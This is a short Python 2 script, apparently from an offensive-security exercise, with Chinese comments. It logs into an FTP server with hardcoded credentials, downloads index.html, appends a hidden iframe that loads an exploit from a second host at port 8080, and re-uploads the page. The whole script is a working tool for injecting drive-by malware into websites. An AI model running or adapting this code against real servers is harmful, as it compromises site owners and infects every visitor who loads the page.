#!/usr/bin/python
#coding=utf-8
import ftplib

def injectPage(ftp,page,redirect):
	f = open(page + '.tmp','w')
	#下载FTP文件
	ftp.retrlines('RETR ' + page,f.write)
	print '[+] Downloaded Page: ' + page
	f.write(redirect)
	f.close()
	print '[+] Injected Malicious IFrame on: ' + page
	#上传目标文件
	ftp.storlines('STOR ' + page,open(page + '.tmp'))
	print '[+] Uploaded Injected Page: ' + page

host = '10.10.10.130'
username = 'ftpuser'
password = 'ftppassword'
ftp = ftplib.FTP(host)
ftp.login(username,password)
redirect = '<iframe src="http://10.10.10.160:8080/exploit"></iframe>'
injectPage(ftp,'index.html',redirect)